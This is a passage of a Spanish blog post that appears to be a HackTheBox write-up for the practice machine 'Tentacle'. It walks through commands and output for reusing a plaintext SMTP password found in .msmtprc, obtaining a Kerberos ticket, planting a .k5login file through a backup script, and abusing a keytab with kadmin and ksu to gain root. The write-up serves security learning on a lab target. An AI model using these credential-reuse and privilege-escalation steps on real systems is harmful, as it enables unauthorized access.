+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_proxy_smtp_revSH.png" alt="310bash_proxy_smtp_revSH" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_revSHwithSMTP_done.png" alt="310bash_revSHwithSMTP_done" /></p>
+
+<p>Perfectoooooooooooooooooooooooooooooooooooooooo, estamos dentrooooo. Ufff que locura eh!</p>
+
+<p><strong>(El tema es que en el servidor no están instalados ni <code>nc</code> ni <code>curl</code>, por eso no podíamos ejecutarlos antes. El exploit que habíamos encontrado en</strong> github <strong>estaba usando <code>nc</code>, no se me paso por la mente cambiarlo para conseguir una Shell con <code>bash /dev/tcp...</code>, por eso tampoco funcionada. Pero cambiando esa línea por <code>bash...</code> también obtenemos una Shell :P Hubiera sido más directo pero nos sirvió para entender mejor la vulnerabilidad)</strong></p>
+
+<p>Bueno, ahora a enumerar… (Antes, hacemos tratamiento de la TTY, <a href="https://www.youtube.com/watch?v=GVjNI-cPG6M&amp;t=1689">s4vitar nos lo explica</a>).</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>En el directorio <code>/home</code> nos encontramos el usuario <code>j.nakazawa</code>, el cual tiene un archivo interesante:</p>
+
+<pre><code class="language-bash">root@smtp:/home/j.nakazawa$ cat .msmtprc 
+# Set default values for all following accounts.
+defaults
+auth           on
+tls            on
+tls_trust_file /etc/ssl/certs/ca-certificates.crt
+logfile        /dev/null
+
+# RealCorp Mail
+account        realcorp
+host           127.0.0.1
+port           587
+from           j.nakazawa@realcorp.htb
+user           j.nakazawa
+password       sJB}RM&gt;6Z~64_
+tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60
+
+# Set a default account
+account default : realcorp
+</code></pre>
+
+<p>Según nuestra búsqueda, se trata de un archivo de configuración del servicio <a href="https://alquimistadesistemas.com/enviar-correos-desde-el-cliente-msmtp-por-consola.html">msmtp</a> (Cliente <strong>SMTP</strong>) el cual contiene una contraseña y un usuario potencial, pero en el servicio <strong>mail</strong>…</p>
+
+<p>Si intentamos rehusar esa contraseña hacia la máquina no obtenemos nada…</p>
+
+<p>Podemos validar la veracidad de esa contraseña en el servicio <code>SMTP</code> con la ayuda de esta guía](https://wiki.archlinux.org/index.php/OpenSMTPD#Manual_Submission_port_authentication):</p>
+
+<pre><code class="language-bash"># Primero la pasamos a base64
+root@smtp:/home/j.nakazawa$ printf '\0j.nakazawa\0sJB}RM&gt;6Z~64_' | base64
+AGoubmFrYXphd2EAc0pCfVJNPjZafjY0Xw==
+
+# Ahora nos conectamos al servicio que esta corriendo en el puerto 587
+root@smtp:/home/j.nakazawa$ openssl s_client -host 127.0.0.1 -port 587 -starttls smtp
+CONNECTED(00000003)
+...
+---
+250 HELP
+</code></pre>
+
+<p>Saludamos al servicio <code>SMTP</code> y nos autenticamos:</p>
+
+<pre><code class="language-bash">250 HELP
+HELO lanz.corp
+250 smtp.realcorp.htb Hello lanz.corp [127.0.0.1], pleased to meet you
+AUTH PLAIN # Escribimos esto
+334 
+AGoubmFrYXphd2EAc0pCfVJNPjZafjY0Xw==     # Colocamos la cadena en base64
+235 2.0.0 Authentication succeeded
+</code></pre>
+
+<p>Pero no podemos ver nada con esto…</p>
+
+<p>De nuevo estuve buscando formas pero no entendía que hacer, asi que necesite algo de ayuda. Me indicaron que me enfocara en el servicio <code>kerberos</code> (que habíamos encontrado en el escaneo inicial) y que sobre todo estuviera atento a los hosts :P</p>
+
+<p>Bueno bueno bueeeno…</p>
+
+<blockquote>
+  <p><code>Kerberos</code>: Protocolo de autenticación. Su finalidad es proveer mayor seguridad, ya que la persona que quiera ingresar al sistema, primero debera hacer una peticion al <strong>KDC</strong> (Centro de distribucion de llaves) pidiendo un ticket (<strong>Ticket-Granting Ticket</strong>), el ticket sera encriptado usando la password como llave y nos devolvera el ticket con un tiempo de expiracion para iniciar sesión.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-user/Introduction.html#Introduction">Breve introducción a <strong>Kerberos</strong></a>.</li>
+</ul>
+
+<p>Claramente su uso es más profundo, pero en términos generales podemos tener esa idea…</p>
+
+<p><img src="https://www.varonis.com/blog/wp-content/uploads/2018/07/Kerberos-Graphics-1-v2-787x790.jpg" alt="310cita_varonis_simple_kerberos_diagram" /></p>
+
+<blockquote>
+  <p>Imagen tomada de <a href="https://www.varonis.com/blog/kerberos-authentication-explained/">varonis.com/kerberos-authentication-explained</a>.</p>
+</blockquote>
+
+<p>Algunos recursos que están buenos pa echarles el ojo:</p>
+
+<ul>
+  <li><a href="https://www.tarlogic.com/blog/como-funciona-kerberos/">Como funciona <strong>Kerberos</strong> - ES</a>.</li>
+  <li><a href="https://www.varonis.com/blog/kerberos-authentication-explained/"><strong>Kerberos</strong> authentication</a>.</li>
+</ul>
+
+<p>Bueno, ahora que tenemos la idea, veamos que tenemos para jugar con <code>kerberos</code>:</p>
+
+<ul>
+  <li>Tenemos a <code>kerberos</code> corriendo sobre el puerto <code>88</code> del host <code>10.10.10.224</code>.</li>
+  <li>El dominio del <code>kerberos</code> esta sobre <code>realcorp.htb</code> (si recordamos en el inicio cuando revisamos el puerto desde la web, ahí aparecía).</li>
+  <li>Contamos con unas credenciales que posiblemente se estén reutilizando: <code>j.nakazawa -&gt; sJB}RM&gt;6Z~64_</code>.</li>
+</ul>
+
+<p>Buscando maneras de logearnos al servicio, encontramos este recurso:</p>
+
+<ul>
+  <li><a href="https://ubuntu.com/server/docs/service-kerberos">Service <strong>Kerberos</strong> - Ubuntu</a>.</li>
+</ul>
+
+<p>Nos indica lo que debemos descargar:</p>
+
+<pre><code class="language-bash">apt install krb5-user sssd-krb5
+</code></pre>
+
+<p>En el proceso nos salta una ventana (supongo que es esta, ya que escribí esto despues de la descarga :P) en la que debemos indicarle el dominio y servidor <code>kerberos</code>:</p>
+
+<p>Dominio (reino, esta explicado en la misma imagen e.e)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_install_krb5_utils_domain.png" alt="310bash_install_krb5_utils_domain" /></p>
+
+<p>Servers (acá escribimos el servidor en el que esta montado <code>kerberos</code>)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_install_krb5_utils_server1.png" alt="310bash_install_krb5_utils_server1" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_install_krb5_utils_server2.png" alt="310bash_install_krb5_utils_server2" /></p>
+
+<blockquote>
+  <p>Para volver a obtener la configuración (por si la embarramos o cualquier otra cosa) escribimos: <code>sudo dpkg-reconfigure krb5-config</code>.
+Asi mismo, el archivo en que se estan guardando estas configuraciones esta en la ruta: <code>/etc/krb5.conf</code>.</p>
+</blockquote>
+
+<p>Listos, ahora debemos fijarnos en nuestro archivo <code>/etc/hosts</code> para que el servidor <code>kerberos</code> (<code>10.10.10.224:88</code>) apunte correctamente al dominio al que queremos obtener una sesión:</p>
+
+<blockquote>
+  <p>Si recordamos el error que nos salio cuando enumeramos el proxy en la web. Vimos que nos respondia con el dominio del cual provenia esa respuesta, osea el dominio al que necesitamos ir:</p>
+</blockquote>
+
+<pre><code class="language-bash">❭ cat /etc/hosts
+...
+10.10.10.224    srv01.realcorp.htb
+...
+</code></pre>
+
+<p>Ahora sí, juguemos con <code>kerberos</code>. Para generar el ticket debemos usar <code>kinit</code>:</p>
+
+<pre><code class="language-bash">❭ kinit j.nakazawa@realcorp.htb
+kinit: Cannot find KDC for realm "realcorp.htb" while getting initial credentials
+
+❭ kinit j.nakazawa@REALCORP.HTB
+Password for j.nakazawa@REALCORP.HTB:
+</code></pre>
+
+<p>Para validar que se nos generó el ticket, podemos listarlos:</p>
+
+<pre><code class="language-bash">❭ klist
+Ticket cache: FILE:/tmp/krb5cc_0
+Default principal: j.nakazawa@REALCORP.HTB
+
+Valid starting     Expires            Service principal
+07/03/21 21:00:30  08/03/21 21:00:30  krbtgt/REALCORP.HTB@REALCORP.HTB
+</code></pre>
+
+<p>Perfecto, ahora validemos contra el servicio <code>SSH</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_ssh_srv01_shell_jNakazawa.png" alt="310bash_ssh_srv01_shell_jNakazawa" /></p>
+
+<p>BIEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEN, estamos dentro ahora de <code>srv01.realcorp.htb</code> y tenemos acceso a la flag <code>user.txt</code> :’)</p>
+
+<p>Que locura, que vaina tan loca, lindo camino. Y bueno, ahora nos queda la mejor parte :P</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Si validamos usuarios y archivos relacionados encontramos esto:</p>
+
+<pre><code class="language-bash">[j.nakazawa@srv01 ~]$ ls /home/
+admin  j.nakazawa
+</code></pre>
+
+<pre><code class="language-bash">[j.nakazawa@srv01 ~]$ find / -group admin 2&gt;/dev/null
+/etc/krb5.keytab
+/usr/local/bin/log_backup.sh
+/home/admin
+</code></pre>
+
+<p>Vemos un archivo interesante, si nos fijamos en su contenido nos damos cuenta de algo:</p>
+
+<pre><code class="language-bash">[j.nakazawa@srv01 ~]$ cat /usr/local/bin/log_backup.sh
+#!/bin/bash
+
+/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
+cd /home/admin
+/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
+/usr/bin/rm -f access.log cache.log
+</code></pre>
+
+<p>Esta haciendo una sincronización (backup) total del directorio <code>/var/log/squid/*</code> hacia el directorio <code>/home/admin</code> y despues simplemente los comprime con fecha y hora…</p>
+
+<p>Si intentamos ver el contenido de <code>/var/log/squid/</code> no podemos:</p>
+
+<pre><code class="language-bash">[j.nakazawa@srv01 ~]$ ls -la /var/log/squid/
+ls: no se puede abrir el directorio '/var/log/squid/': Permission denied
+
+[j.nakazawa@srv01 ~]$ ls -la /var/log
+...
+drwx-wx---.  2 admin  squid      41 mar  8 16:03 squid
+...
+</code></pre>
+
+<p>Validando en que grupo estamos asignados:</p>
+
+<pre><code class="language-bash">[j.nakazawa@srv01 ~]$ id
+uid=1000(j.nakazawa) gid=1000(j.nakazawa) grupos=1000(j.nakazawa),23(squid),100(users) contexto=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+</code></pre>
+
+<p>Tenemos asignado el grupo <code>squid</code>, intentemos escribir cualquier cosa sobre esa ruta:</p>
+
+<pre><code class="language-bash">[j.nakazawa@srv01 ~]$ echo "holas" &gt; /var/log/squid/holas
+[j.nakazawa@srv01 ~]$ ls -la /var/log/squid/holas
+-rw-rw-r--. 1 j.nakazawa j.nakazawa 6 mar  8 16:17 /var/log/squid/holas
+[j.nakazawa@srv01 ~]$ cat /var/log/squid/holas
+holas
+</code></pre>
+
+<p>Bien, podemos escribir, ahora sabemos que ese archivo <code>"/holas"</code> será enviado al directorio <code>/home/admin</code>… Pero ¿qué podemos mover a su directorio para poder obtener su sesión?… (Pues aún no lo sé :P)</p>
+
+<p>Y sí, estuve un tiempo pensando, pero no se me ocurrió nada, asi que busque ayuda. La cual me indico: “no te olvides de <code>kerberos</code>“…</p>
+
+<p>Intentando desencriptar el mensaje, encontré <a href="https://serverfault.com/questions/608928/kerberos-k5login-and-sudo">este hilo</a> hablando sobre <code>.k5login</code>, además encontré esta definición:</p>
+
+<blockquote>
+  <p>“The <code>.k5login</code> file, which resides in a user’s home directory, contains a list of the Kerberos principals. Anyone with valid tickets for a principal in the file is allowed host access with the <code>UID</code> of the user in whose home directory the file resides. One common use is to place a <code>.k5login</code> file in root’s home directory, thereby granting system administrators remote root access to the host via Kerberos.” <a href="https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html">web.mit.edu/.k5login</a>.</p>
+</blockquote>
+
+<p>Perfecto, como nos indica, cualquiera con el archivo <code>.k5login</code> en su directorio <code>/home</code> permitirá obtener una sesión como él (UID). Simplemente el archivo <code>.k5login</code> debe contener un usuario válido en el dominio <code>kerberos</code>, tenemos a <code>j.nakazawa@REALCORP.HTB</code>, asi que generemos el archivo y movámoslo…</p>
+
+<blockquote>
+  <p>Suppose the user <code>alice</code> had a <code>.k5login</code> file in her home directory containing just the following line:</p>
+  <blockquote>
+    <p>bob@FOOBAR.ORG
+This would allow <code>bob</code> to use Kerberos network applications, such as <code>ssh</code>, to access <code>alice‘s</code> account, using <code>bob‘s</code> Kerberos tickets.</p>
+  </blockquote>
+</blockquote>
+
+<ul>
+  <li><a href="https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html">Definición de <strong>.k5login</strong> que sirvió como referencia</a>.</li>
+</ul>
+
+<p>Creemos el archivo:</p>
+
+<pre><code class="language-bash">[j.nakazawa@srv01 ~]$ echo "j.nakazawa@REALCORP.HTB" &gt; .k5login
+[j.nakazawa@srv01 ~]$ cat .k5login 
+j.nakazawa@REALCORP.HTB
+</code></pre>
+
+<p>Ahora lo movemos e intentamos conectarnos como <code>admin</code> por <code>SSH</code>, no sabemos cada cuanto se ejecute el script, asi que vamos validando…</p>
+
+<pre><code class="language-bash">[j.nakazawa@srv01 ~]$ mv .k5login /var/log/squid/
+</code></pre>
+
+<p>Yyy:</p>
+
+<pre><code class="language-bash">❭ ssh admin@10.10.10.224
+admin@10.10.10.224's password:
+
+❭ ssh admin@10.10.10.224
+admin@10.10.10.224's password:
+
+❭ ssh admin@10.10.10.224
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last login: Mon Mar  8 16:42:02 2021
+[admin@srv01 ~]$
+</code></pre>
+
+<p>Perfecto, peeeeeeeeeeeerfecto.</p>
+
+<p>Enumerando al usuario <code>admin</code> encontramos un archivo interesante:</p>
+
+<pre><code class="language-bash">[admin@srv01 ~]$ find / -group admin 2&gt;/dev/null | grep -vE "sys|proc|run"
+/etc/krb5.keytab
+/usr/local/bin/log_backup.sh
+/home/admin
+/home/admin/.ssh
+</code></pre>
+
+<p>Validándolo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_validating_content_keytab_file.png" alt="310bash_validating_content_keytab_file" /></p>
+
+<p>Jmm, veamos que tipo de archivo es:</p>
+
+<pre><code class="language-bash">[admin@srv01 ~]$ file /etc/krb5.keytab
+/etc/krb5.keytab: Kerberos Keytab file, realm=REALCORP.HTB, principal=host/srv01.realcorp.htb, type=1, date=Tue Dec  8 22:15:30 2020, kvno=2
+</code></pre>
+
+<p>Parece relevante, investigando sobre él, encontramos:</p>
+
+<blockquote>
+  <p>“La clave de servicio es utilizada por un servicio para autenticarse a sí misma en el <code>KDC</code>, y solo es conocida por <code>Kerberos</code> y el servicio.”
+“Un archivo <code>keytab</code> es análogo a la contraseña de un usuario. De la misma manera que es importante que los usuarios protejan sus contraseñas, es importante que los servidores de aplicaciones protejan sus archivos keytab. Siempre debe guardar los archivos keytab en un disco local y permitir su lectura sólo al usuario <code>root</code>.”</p>
+  <blockquote>
+    <p><a href="https://docs.oracle.com/cd/E24842_01/html/E23286/aadmin-10.html">docs.oracle.com/keytab</a>.</p>
+  </blockquote>
+</blockquote>
+
+<ul>
+  <li><a href="https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-install/The-Keytab-File.html">Más info sobre <strong>keytab file</strong></a>.</li>
+</ul>
+
+<p>Uff pues si tiene relevancia, jugando con Google, encontramos como listar las llaves guardadas en cache del archivo <code>.keytab</code>:</p>
+
+<ul>
+  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#ccache-ticket-reuse-from-keytab">PayloadAllTheThings/ActiveDirectory/keytab</a>.</li>
+</ul>
+
+<pre><code class="language-bash">[admin@srv01 ~]$ klist -k /etc/krb5.keytab
+Keytab name: FILE:/etc/krb5.keytab
+KVNO Principal
+---- --------------------------------------------------------------------------
+2 host/srv01.realcorp.htb@REALCORP.HTB
+2 host/srv01.realcorp.htb@REALCORP.HTB
+2 host/srv01.realcorp.htb@REALCORP.HTB
+2 host/srv01.realcorp.htb@REALCORP.HTB
+2 host/srv01.realcorp.htb@REALCORP.HTB
+2 kadmin/changepw@REALCORP.HTB
+2 kadmin/changepw@REALCORP.HTB
+2 kadmin/changepw@REALCORP.HTB
+2 kadmin/changepw@REALCORP.HTB
+2 kadmin/changepw@REALCORP.HTB
+2 kadmin/admin@REALCORP.HTB
+2 kadmin/admin@REALCORP.HTB
+2 kadmin/admin@REALCORP.HTB
+2 kadmin/admin@REALCORP.HTB
+2 kadmin/admin@REALCORP.HTB
+</code></pre>
+
+<p>Vale vale valeee…</p>
+
+<p>Despues de enumerar los comandos que podemos ejecutar mediante <code>kerberos</code>:</p>
+
+<pre><code class="language-bash">[admin@srv01 ~]$ k
+k5srvutil       kadmin.local    kbdrate         kdestroy        kexec           klist           kpasswd         kpropd          ksu             kvm_stat
+kadmin          kbdinfo         kbxutil         kdumpctl        kill            kmod            kpatch          kproplog        kswitch         kvno
+kadmind         kbd_mode        kdb5_util       kernel-install  kinit           kpartx          kprop           krb5kdc         ktutil
+</code></pre>
+
+<p>Dos me llamaron la atención de primeras, <code>ksu</code> y <code>kadmin</code>. Buscando en internet sus funcionalidades, el más relevante del cual empezaremos a desplegarnos será <code>ksu</code>. Es una versión “kerberized” del programa <code>su</code> en linux. Su “misión” es la de autenticar y autorizar. Todo esto permitiéndoselo (resolviendo) al “target principal name” (como el usuario principal).</p>
+
+<ul>
+  <li><a href="https://web.mit.edu/kerberos/krb5-devel/doc/user/user_commands/ksu.html">Docs Kerberos - User commands (<strong>ksu</strong>)</a>.</li>
+</ul>
+
+<p>Entonces, tenemos la idea de algo llamado “target principal name”, si buscamos en la web sobre como modificar o agregar algo asi, tenemos:</p>
+
+<ul>
+  <li><a href="https://docs.cloudera.com/documentation/enterprise/5-3-x/topics/cm_sg_get_princ_4_users_s16.html">Docs Cloudera - Get or create a <strong>kerberos principal</strong> for each user account</a>.</li>
+</ul>
+
+<blockquote>
+  <p>In the <code>kadmin.local</code> or <code>kadmin</code> shell, use the following command to <strong>create a principal</strong> for your account by replacing <code>EXAMPLE.COM</code> with the name of your <code>realm</code>, and replacing <code>username</code> with a <code>username</code>:</p>
+  <blockquote>
+    <p>kadmin:  addprinc username@EXAMPLE.COM</p>
+  </blockquote>
+</blockquote>
+
+<ul>
+  <li>Tons, debemos agregarle el <code>dominio</code> (realm) y el usuario (<code>root</code>, para despues usar el comando <code>ksu</code> y obtener una sesión como él, ya que será el «principal»).</li>
+</ul>
+
+<p>Entonces, si jugamos con <code>kadmin</code> como comando nos muestra:</p>
+
+<pre><code class="language-bash">[admin@srv01 ~]$ kadmin 
+Couldn't open log file /var/log/kadmind.log: Permission denied
+Authenticating as principal admin/admin@REALCORP.HTB with password.
+kadmin: Client 'admin/admin@REALCORP.HTB' not found in Kerberos database while initializing kadmin interface
+</code></pre>
+
+<p>Vale, nuestro usuario no puede usarlo, pero recordemos el archivo <code>.keytab</code>, usémoslo y probemos con sus usuarios:</p>
+
+<pre><code class="language-bash">[admin@srv01 ~]$ klist -k /etc/krb5.keytab | sort -u
+---- --------------------------------------------------------------------------
+2 host/srv01.realcorp.htb@REALCORP.HTB
+2 kadmin/admin@REALCORP.HTB
+2 kadmin/changepw@REALCORP.HTB
+Keytab name: FILE:/etc/krb5.keytab
+KVNO Principal
+</code></pre>
+
+<pre><code class="language-bash">[admin@srv01 ~]$ kadmin -h
+kadmin: invalid option -- 'h'
+Usage: kadmin [-r realm] [-p principal] [-q query] [clnt|local args]
+      [command args...]
+clnt args: [-s admin_server[:port]] [[-c ccache]|[-k [-t keytab]]]|[-n]
+local args: [-x db_args]* [-d dbname] [-e "enc:salt ..."] [-m]where,
+[-x db_args]* - any number of database specific arguments.
+                Look at each database documentation for supported arguments
+</code></pre>
+
+<pre><code class="language-bash">[admin@srv01 ~]$ kadmin -kt /etc/krb5.keytab
+Couldn't open log file /var/log/kadmind.log: Permission denied
+Authenticating as principal host/srv01.realcorp.htb@REALCORP.HTB with keytab /etc/krb5.keytab.
+kadmin:  
+</code></pre>
+
+<p>Bien, tenemos una “Shell” dentro de <code>kadmin</code> para configurar lo que necesitemos yy estamos “autenticados” como principal (quizás ya podemos relacionar el «target principal name») <code>host/srv01.realcorp.htb@REALCORP.HTB</code>.</p>
+
+<p>Intentemos ahora si agregar el nuevo «target principal name» según lo que encontramos (como queremos que nuestro principal sea <code>root</code>, asi mismo lo indicaremos):</p>
+
+<pre><code class="language-bash">kadmin:  addprinc root@REALCORP.HTB
+No policy specified for root@REALCORP.HTB; defaulting to no policy
+Enter password for principal "root@REALCORP.HTB": 
+Re-enter password for principal "root@REALCORP.HTB": 
+add_principal: Operation requires ``add'' privilege while creating "root@REALCORP.HTB".
+kadmin:  
+</code></pre>
+
+<p>Pero no nos deja, no tenemos permisos, intentemos con otro «principal», siguiendo la lista del <code>.keytab</code> seria <code>kadmin/admin@REALCORP.HTB</code>.</p>
+
+<p>Para indicárselo al <code>kadmin</code> le agregamos el parámetro <code>-p</code>:</p>
+
+<pre><code class="language-bash">[admin@srv01 ~]$ kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
+Couldn't open log file /var/log/kadmind.log: Permission denied
+Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
+kadmin:  addprinc root@REALCORP.HTB
+No policy specified for root@REALCORP.HTB; defaulting to no policy
+Enter password for principal "root@REALCORP.HTB": 
+Re-enter password for principal "root@REALCORP.HTB": 
+Principal "root@REALCORP.HTB" created.
+kadmin:  
+</code></pre>
+
+<p>Vale, con este «principal» logramos la creación del nuevo «principal» con su respectiva contraseña (cualquiera).</p>
+
+<p>Ahora probemos con el comando <code>ksu</code>, coloquemos la contraseña que le hallamos puesto y veamos que nos muestra:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_kadmin_shell_as_root.png" alt="310bash_kadmin_shell_as_root" /></p>
+
+<p>PERFECTOOOOO!! Somos <code>root</code> en la máquina, todo mediante el archivo <code>.keytab</code> el cual nos permitió cambiar el “target principal name” para obtener una Shell como él (: Que locura :o</p>
+
+<ul>
+  <li><a href="https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-admin/Adding-or-Modifying-Principals.html">Info sobre <strong>Adding or Modifying pricipals</strong></a>.</li>
+  <li><a href="https://docs.fedoraproject.org/es-ES/Fedora/13/html/Security_Guide/sect-Security_Guide-Kerberos-Setting_Up_Secondary_KDCs.html">Configurando <strong>KDCs</strong> - <strong>kadmin add_pricipal</strong></a>.</li>
+  <li><a href="https://docs.oracle.com/cd/E19683-01/806-4078/6jd6cjs1l/index.html">Administrating <strong>Keytab</strong> files</a>.</li>
+</ul>
+
+<p>Ahora, solo nos quedaría ver las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310flags.png" alt="310flags" /></p>
+
+<p>…</p>
+
+<p>Que cosa insana parceeeeee. Me pareció súper difícil :o Igual muchísimos conceptos nuevos y que no había trabajado, eso también conllevo al buscar bastante ayuda, pero bueno, no podemos quedarnos estancados, lo mejor es buscar ayuda para al menor tener algo de luz. Me encanto el uso de <code>proxychains</code>. Fue mi parte favorita. El jugar con <code>kerberos</code> fue bastante interesante, entender su funcionamiento y herramientas, increíble. Lindo aprendizaje…</p>
+
+<p>Y bueno, como siempre, muchísimas gracias por leerse tooooda esta locura y a seguir rompiendo todo. Esta máquina me dejo el cerebro exhausto :P</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Tentacle&url=http://localhost:4000/htb/tentacle" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SMTP">SMTP</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#kerberos">kerberos</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#proxychains">proxychains</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#squid-proxy">squid-proxy</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/active">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148banner.png" alt="HackTheBox - Active"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/active">HackTheBox - Active</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio, de cabeza contra un Domain Controller, jugaremos mucho con SMB y sus carpetas compartidas, movimientos SYStematicos y VOLtaicos e.e, bastante crackeo de contraseñas y obtención de...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">16 May 2021</span>
+                </span>
+                <div class="clearfix"></div>
